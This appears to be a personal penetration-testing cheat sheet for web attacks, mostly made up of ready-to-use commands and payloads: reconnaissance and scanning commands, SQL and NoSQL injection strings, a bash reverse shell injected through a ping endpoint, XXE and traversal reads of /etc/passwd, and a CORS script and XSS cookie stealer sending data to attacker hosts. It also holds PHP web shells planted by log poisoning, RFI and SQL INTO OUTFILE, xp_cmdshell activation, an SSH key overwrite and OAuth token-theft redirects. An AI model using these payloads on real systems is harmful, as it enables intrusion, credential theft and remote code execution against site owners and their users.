# Intro

This is a cheat sheet for exploitation of OWASP Top 10.

It is the followed by more refined attacks. 

## recon

### Domain intel

`https://crt.sh/?q=qmspot.com`

dnsrecon

subslister

dnsreaper

amass enum -active -d $domain -brute -w $sub_domains -o $domain.recon.log -timeout 30

### Web server detection and vuln scan

```bash

docker run -v $(pwd):/home/rustscan/  -it --rm --name rustscan rustscan/rustscan:latest --top -a /home/rustscan/targets.txt -b 1000

subfinder -all -t 50 -d example.com | tee subdomains.txt

gowitness scan file -f subdomains.txt --threads 100 --write-db

gowitness report server 127.0.0.1:7171

nuclei -list urls.txt


```
## Other service recon

```bash

#This gives list of ip of resolved domains

dnsx -l subdomains.txt -a -resp -silent | sort -u > resolved-ips.txt

```

```bash
#prepare output for masscan

cat resolved-ips.txt | tr '\n' ',' | sed 's/ //g'  > masscan-ips.txt 
```

```bash
#Scan for ports

masscan -p$(cat ~/Tools/recon/top1000-ports.txt) --rate=1000 --banners $(cat masscan-ips.txt) -oG ports-grep.txt  | tee port-scan.txt
```

```bash
#make list ip port
cat masscan-ports.txt | grep -vE '^#' | awk '{print $4, $7}' | sed 's/\/open.*$//' | tr ' ' ':'  |  sort -u > resolved-ports.txt
```

```bash
#scan with naabu
naabu -l resolved-hosts.txt -pf uniq-comma-ports.txt -Pn -o naabu-scan.txt -verify -timeout 15 -v
#provides already output as IP:PORT
```

```bash
#scan each port with nmap
 while IFS=':' read -r IP port; do nmap -p "$port" -T3 -n -Pn  -sCV "$IP" >> nmap-scan.txt; done < resolved-ports.txt
```


## Dirbust


```bash
dirsearch -u https://example.com -o m-n1-dirb.txt --crawl --user-agent='Mozilla/5.0' -t 60 -i 200,300-399 -r -f -e html,php,asp,aspx
```

## Download site copy

loots a `/folder` content

```bash
wget -r -np -R "index.html*" https://target.to.loot/folder/
```

## Exploitation methodology

Basically, there are many web related cyber attacks. But all of them can be put into those few categories based on the type of payload triggering:

* injections: Command injection, XXS, XXE ...
* backend logic manipulation: access control bypass (reaching API endpoint which is not supposed to be reached), race condition, CSRF
* cryptography defeat: inherent 

### Injections

It used to be the most common 



## SAML
## OAuth
## JWT
## ACL
## SQLi

### time based

```bash
# MSSQL
    'admin" OR IF(1=1, SLEEP(5), 0) -- ',
    'admin" OR IF(1=2, 0, SLEEP(5)) -- ',
    'admin" OR IF(1=1, BENCHMARK(1000000, MD5(1)), 0) -- ',
    'admin" OR IF(1=2, 0, BENCHMARK(1000000, MD5(1))) -- ',
    'admin" OR IF(LENGTH(database()) > 1, SLEEP(5), 0) -- ',
    'admin" OR IF(LENGTH(database()) > 100, 0, SLEEP(5)) -- ',
    'admin" OR IF(EXISTS(SELECT 1 FROM users), SLEEP(5), 0) -- ',
    'admin" OR IF(EXISTS(SELECT * FROM information_schema.tables), SLEEP(5), 0) -- ',
    'admin" OR IF(EXISTS(SELECT 1), SLEEP(5), 0) -- ',
    'admin" OR IF(1=1, SLEEP(5), 0) /* '

```

## noSQLi

No SQL injection occurs in non-relational databases such MongoDB, REDIS and others. These data bases work with paradigms containing full logical operators, json and specific query syntax no like SQL and much more advanced.
So basically to target noSQL DB it is needed to identify underlying technology. However. the workflow is much alike SQL.

1. Detect the injection point.

```bash

# fuzz to detect abnormal response
ffuf -w https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/NoSQL%20Injection/Intruder/NoSQL.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401

```
As always check PayloadsAllTheThings and PortSwigger. In case of WAF use double encoding, capitalization and other obfuscation measures.

Some quick n dirty strings

```text
'"`{
;$Foo}
$Foo \xYZ
```

Oneliner

```
'\"`{\r;$Foo}\n$Foo \\xYZ\u0000
```

Dont forget to URL encode this stuff (Ctrl + U in Burp).

Additionally, it is good to confirm the injection point using some kind of `sleep()` function. Like `sleep(5000)` would cause MongoDB query to wait 5 seconds.

2. Then determine which characters cause trouble and try narrowing down how to manipulate them into not producing an error. 

```http

#produces error
/?filter='

#no error
/?filter='\''

```

3. Inject logic into the queries to monitor what causes true and false conditions:

```http

# dont forget to URL encode!

# error
/?filter=' && 0 && ' 

# no error?
/?filter=' || 0 || ' 

# retrieve everytrhing!
/?filter=' || 1 || ' 

```

Also works sometimes to inject nullbytes to force the DB to ignore any subsequent characters:

```http

/?filter=' || 1 %00

```

4. Inject noSQL query operators:

```text

$ne	    not equal
$regex	regular expression
$gt	    greater than
$lt	    lower than
$nin	not in

```

5. noSQL expressions can be sent with any types of request. However, GET request does not accept `[]`, so it is needed to probe if the target server accepts POST. In this case, basic auth bypass within the request body can look like this `username[$ne]=xaxaxa&password[$ne]=xaxaxa`. If only json is accepted then convert `Content-Type` from `application/x-www-form-urlencoded` to `application/json` this can be also easily done in Burp with `Content Type Converter`.

Here is a summary of basic auth bypass attack:

```http
GET /login.php HTTP/1.
Host: localhost
Content-Type: application/x-www-form-urlencoded

username[$ne]=xaxaxa&password[$ne]=xaxaxa
```

Using json payload (for MongoDB):

```http
GET /login.php HTTP/1.
Host: localhost
Content-Type: application/json

{
    "username":{"$ne": "xaxaxa"},
    "password":{"$ne": "xaxaxa"}
}

```

6. One of the most useful features is `$where` expression that returns data matching `js` function:

```js

db.family.find({ $where: function() { return (this.name.first == 'admin') } })

```

You can quickly see that it is useful in case some app receives some parameter and uses it as part of `js` function. Attacker can then inject complete `js` expression like it is done here:

```js
admin' && this.password[0] == 'a' || 'a'=='b
```

Therefore, simmilar to blind SQL injection attacker can iterate letter by letter through this to get the complete password.

7. So, the `$where` operator is VERY DANGEROUS. It allows executing ANY JavaScript passed to MongoDB.

So either add additional `{$where : 1}` to the POST request or inject somewhere else to check it. IF it executes it means that may be ANY JavaScript can be injected into the DB.

## OS injection

Some backends process user input as part of system commands like in this code snippet:

```python 
import flask
import subrocess 

@app.route('/what_is_my_ping')
def query_example():
# consider a case in a flask app when user enters IP address in the front end to get the ping from the server
    user_ip = request.args.get('user_ip_input')
    command = f"ping -c 1 {user_ip}"
    result = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)

```

Here you can see the attacker can break out of the program context by entering:

```bash
#thx to revshells.com
/what_is_my_ping?8.8.8.8; sh -i >& /dev/tcp/10.10.10.10/9001 0>&1

```

DONT FORGET TO URL encode (Ctrl + U) in Burp the payload.

That would open a liste

## SSTI
## XXE

If XML parser is poorly configured and no user sanitization applied then try forcing LFI:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
```



## XSLT
## Deserilization
## Race condition
## CORS

CORS regulates which websites can access ressources of the current website. So, if the ACAO policy is poorly configured then any website can fetch data from the victim website.

This is BAD because if there is a CSRF or any otyher vulnerability within the resources of the victim site then those can be access with a `js` like the one from portswigger tutorial:

```js

<script>

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0ac2009304c1c1ac835982d9008a0041.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location='https://exploit-0a7500650485c1c5834681ca017500b8.exploit-server.net/exploit/log?key='+this.responseText;
};

</script>

```

## XSS

Many WAFs block `alert()`.. so instead of it try using `<script>debugger;</script>` to detect xss injection point.

## CSRF
## CSTI
## Encryption
## Request Smuggling
## Cache Poisoning

## Directory traversal

Find parameters vulnerable to `../`

You may need to bypass WAF

`http://localhost/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`

Or to provide path as is 

`curl --path-as-is http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd`

Enjoy reading sensitive information.

## XXE injection

It arises from exploiting parsing of ENTITY element. It can be prevented by smart conding practices depending on language used: https://brightsec.com/blog/xxe-prevention/

For payloads refer to: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#exploiting-xxe-to-retrieve-files

1. Detect XXE
```
<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
 <userInfo>
  <firstName>John</firstName>
  <lastName>&example;</lastName>
 </userInfo>
```
2. Exploit 
`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`

## Security Misconfigurations

* Accessible S3 Buckets
* Non functional additional features enabled: like status pages, accounts or privileges
* Default credentials
* Verbose error messages disclosing system properties
* Not using HTTP and cookies security headers
* Non patched systems

## XXS

1. Detect XXS

Submit special characters and see if they are later present in the source code

`xpyxpy " ; < > `


Then look for `xpyxpy` in source code to identify injection points.

```html
<td> John</td><td>I would eat tacos here every day if I could!</td></tr><tr><td> ok</td><td>doki</td></tr><tr><td> fg</td><td>"xpyxpy ; < > ' '</td></tr>	
```


2. Confirm XXS

Alert() is dead: https://portswigger.net/research/alert-is-dead-long-live-print

Use print() instead or use only firefox browser for testing. But this would fail if user uses Chrome and its derivates.

Payloads: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

```
#get document cookies

<script>print(document.cookie)</script>

#get host ip
<script>print(window.location.host)</script>

```
## Script from file
For instance can be used to hook to BeeF browser hijacker.
```
<script src="http://192.168.119.xxx:3000/hook.js"></script>
```

## iframe injection

* Invisible iframe can be inserted into unsanitzed input

```
<iframe src=http://google.com height=”0” width=”0”></iframe>
```
This can be however filtered out by user's browser

## Cookies manipulation

### Important security parameters

* Secure: only send the cookie over HTTPS. This protects the cookie from being sent in cleartext and captured over the network.

* HttpOnly: deny JavaScript access to the cookie. If this flag is not set, we can use an XSS payload can steal the cookie.

### Cookie Stealer Sample script

1. Find XSS vulnerability
2. Craft and inject payload
```
<script>new Image().src="http://IP/some.jpg?output="+document.cookie;</script>
```

### Use Kali's BeEF

BeeF can be used to get system info, users, rev shell etc.

## Insecure Deserialization

tbd properly

## Framework identification

* Wappalyzer
* Favicon
```bash
# grab the favicon like this 

curl https://ip.site.com/sites/favicon/images/favicon.ico | md5sum

#Then find the framework

https://github.com/nmap/nmap/blob/master/nselib/data/favicon-db

```
* Inspect Headers
`user@machine$ curl http://MACHINE_IP -v`

## Fuzzing

* https://github.com/ffuf/ffuf
* gobuster
* dibr

## My approach to Dirbusting

1. Quick scan with default dirb without recusive folder search
`dirb http://IP/ -r`

2. scan for common directories non recursively with gobuster first:
`gobuster dir -u http://ip -w /usr/share/seclists/Discovery/Web-Content/common.txt`

3. then scan recursively within found directories

`dirb http://ip /usr/share/seclists/Discovery/Web-Content/big.txt -X .html,.php,.cgi`

4. finally you can also fuzz the discovered content or anything else within head or requests

`ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://ip/FUZZ` (FUZZ keyword is there where you want to fuzz)

Fuzzing for POST requests

`ffuf -w passwords.txt -u http://192.168.123.52/login.php -H "Content-Type: application/x-www-form-urlencoded" -H "DNT: 1" -H "Upgrade-Insecure-Requests: 1" -d "username=admin&password=FUZZ&debug=0" -H "User-Agent: Fool"  -fr "Failed"`

# Other Web Attacks

## LFI

* detect directory traversal and attempt LFI to get RCE!
* LFI allows executing files (not reading!)
* modify and contaminate some log file
* use LFI to trigger contaminated file

1. Contaminate Logs modifying the request header

`User-Agent: <?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?> `

or 

`User-Agent: <?php echo system($_GET['cmd']); ?>`

2. send request to poison

http://10.11.0.xx/

3. access these logs externally (xampp on windows in this case) but without the poisoned header to execute it

`http://10.11.0.xx/menu.php?file=../../../../../../../var/log/apache2/access.log&cmd=whoami`


### PHP wrappers

Use wrappers to bypass filters.

```bash

# lets access LFI and encode the output as base64

curl http://localhost/index.php?page=php://filter/convert.base64-encode/resource=config.php

# decode base64

echo $b64_output | base64 -d

# also possible to achieve RCE

# 1. encode payload 

echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

# 2. use wrapper

curl "http://localhost/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

## RFI

* create malicious file evil.txt with payload for php or for any other platform

`<?php echo shell_exec($_GET['cmd']); ?>`

This is how evil.txt can be accessed from the victim host hosted on attacker side

`http://VICTIM.IP/menu.php?file=http://ATTACKER.IP/evil.txt?`

* Include %00 or ? to trick php into terminating the string or considering it as part of URL
* To enhance attacks wrappers can be used. Here are php wrappers

```
#data wrapper
http://10.11.xx.xx/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>
```
Payload after text/plain can either plain text or base64 encoded.

Here follos example of base64 payload. Base64 is better as it is less detectable and causes less errors.

```
http://192.168.xxx.10/menu.php?file=data:text/plain,<?php echo shell_exec("dir") ?>

http://192.168.xxx.10/menu.php?file=data:text/plain;base64,PD9waHAgZWNobyBzaGVsbF9leGVjKCJkaXIiKSA/Pg==
```

## Log Poisoning

* submit a request that includes some malicious code

```php

#submit simple php backdoor

nc 10.10.10.xxx 80

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

```

* trigger malicious log

```bash

http://10.10.10.xxx /menu.php?file=../../../../var/log/apache2/access.log&cmd=whoami

```

* tip: `for reverse shell encode the command as url` in Burp or so

## File Uploads

* upload and find path to the file to execute it
* if execution not possible then try overwriting system files if directory traversal aso possible:

```bash

# overwrite ssh keys

# craft malicious key

cat bad.pub > authorized_keys

# overwrite auth keys with attackers pulic key

http://10.10.10.xxx /menu.php?file=../../../../../root/.ssh/authorized_keys

```


## API


### identify endpoints

* look for version conventions like `/some_service/v1` or v2 or v3 etc.
* Prepare pattern for ffuf to identify api endpoints

```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/FUZZ/v1/ -mc 200

```

Or use `gobuster`

`gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern`

where pattern is like 

```txt
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
```

### identify services

Once `endpoint` identifued, look for services


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/FUZZ -mc 200

```

the look for subservices once service_A identified


```bash

ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://ip/endpoint_name/v1/service_A/subservice_A1 -mc 200

```

### identify Methods


```bash

ffuf -w test_methods.txt -u https://ip/endpoint_name/v1/user/change_password -X FUZZ -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4" \
-d '{"name": "admin", "password": "hacked"}' -fr "error"

# where FUZZ is replaced by POST, PUT, GET methods by using a regular token obtained throughout the session

```

* No error mean that this particular method worked
* particularly here admin password might have been changed




## SQL injection

Connect

`mysql -u root -p'pass' -h ip`

A very nice cheat sheet is provided by Portswigger: https://portswigger.net/web-security/sql-injection/cheat-sheet


### Test for SQLi vulnerability
* It is necessary to identify a possible SQLi entry point
* Use of special characters can help (got from [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#entry-point-detection)):

```bash
'
%27
"
%22
#
%23
;
%3B
)
Wildcard (*)
&apos;  # required for XML content

Multiple encoding

%%2727
%25%27

Merging characters

`+HERP
'||'DERP
'+'herp
' 'DERP
'%20'HERP
'%2B'HERP

Logic Testing

page.asp?id=1 or 1=1 -- true
page.asp?id=1' or 1=1 -- true
page.asp?id=1" or 1=1 -- true
page.asp?id=1 and 1=2 -- false

Weird characters

Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
transformed into U+0022 QUOTATION MARK (")
Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
transformed into U+0027 APOSTROPHE (')
```


### MYSQL Comments
-- - Note the space after the double dash
/* MYSQL Comment */
/*! MYSQL Special SQL */
/*!32302 10*/ Comment for MYSQL version 3.23.02

-- - to emphasize space

### Load files using SQLi
```bash
UNION SELECT 1, load_file(/etc/passwd) #

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'
```

### Write files using SQLi

```bash

#dont forget to encode

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE 'c:/xampp/htdocs/cmd.php'

http://example.com/photoalbum.php?id=1 union all select 1,2,3,4,"<?php echo
shell_exec($_GET['cmd']);?>",6,7,8,9 into OUTFILE '/var/www/html/cmd.php'
```

### EXEC shell in MSSQL

```powershell

# inject as a stacked query

12345'; EXEC sp_configure 'show advanced options',1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;EXEC master.dbo.xp_cmdshell 'cmd.exe dir c:'  -- pFml

```

### PostgreSQL

use psql in kali

### Find injectable parameters using SQLMAP

```bash
sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" 
```

Once injection point is found, exploit it to dump or get shell

```bash

sqlmap --url "http://192.168.204.49/class.php" --data="weight=12&height=2323&age=1211&gender=Male&email=ok%40ok.com" -p mail-list --os-shell --level=5 --risk=3

```


## hacking wordpress panel RCE

* create own reverse shell plugin https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell

* use some pre-made plugin https://www.exploit-db.com/exploits/36374

## Fingerprinting target


### Canary Token

* get victim system info
* generate tracking token 
`https://www.canarytokens.org/generate`
* create `web bug/ URL token`
* send token to target
* when triggered check web hook logs or mail

## OAuth

### Recon

* if login is redirected to other website than it is a strong indication that OAuth is used

* look for indicators of authorization endpoint

`/authorization` endpoint containing query parameters: `client_id, redirect_uri, and response_type`

```bash

# example of auth request (copyright portswigger)

GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com

```

* once auth server is known look for configurations via GET to

```bash

/.well-known/oauth-authorization-server
/.well-known/openid-configuration

```

* from there one may have several options: register rogue endpoint, ...

### Steal OAuth token via referrer

Source `https://swisskyrepo.github.io/PayloadsAllTheThings/OAuth%20Misconfiguration/#stealing-oauth-token-via-referer`

```bash

# simple malicious redirect

https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful

https://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com

# Redirect to an accepted Open URL like google to get the access token 

https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com

https://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F


# the scope to bypass a filter on redirect_uri:

https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com
Executing XSS via redirect_uri

https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>

```

### Register rogue endpoint

## OpenID connect

* OAuth is not mean for authentication
* OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication
* it enables authentication on top of OAuth

## CLick jacking test

<!DOCTYPE html>
<html>
<head>
<title>Clickjacking PoC</title>
</head>
<body>
<input type=button value="Click here to Win Prize" style="z-index:-1;left:1200px;position:relative;top:800px;"/>
<iframe src="https://example.com" width=100% height=100% style=”opacity: 0.5;”></iframe>
</body>
</html>

## Obfuscation using encodings

As example `<img src=1 onerror=alert()>`:

* backticks: `<img src=1 onerror=alert``>`
* caps: `<img src=1 oNeRRoR=alert()>`
* URL-encoding:  `%3c%69%6d%67%20%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%29%3e`
* HTML-entity-encoding: `&lt;img src=1 onerror=alert()&gt;`
* leading zeroes with dec or hex encoding: `<a href="javascript&#00000000000058;alert(1)">Click me</a>`
* hex encoding:  `<img src=x onerror="&#x61;lert(1)">`
* unicode encoding: `<img src=1 onerror=\u0061\u006c\u0065\u0072\u0074()>`

Best results can be achieved by combining all of them.

## Prototype pollution

Alters the prototype of some object in js. If there is unsafe assignment of prototype that can be influenced by injection, then a malicious content can be assigned to the object.

Workflow:

1. Find the source of injection. 

Possible injection methods:

```js

// into URL

/?__proto__[ping]=pong;--
/?__proto__.ping=pong;--

```

2. Find the sink (js function or DOM element) that can be accessed by the source.
3. Gadget exploit: a property passed into sink that can be executed.

## Cloud

### S3 Bucket

```python

from boto.s3.connection import S3Connection
conn = S3Connection('access-key','secret-access-key')
bucket = conn.get_bucket('bucket')
for key in bucket.list():
    print(key.name.encode('utf-8'))

```
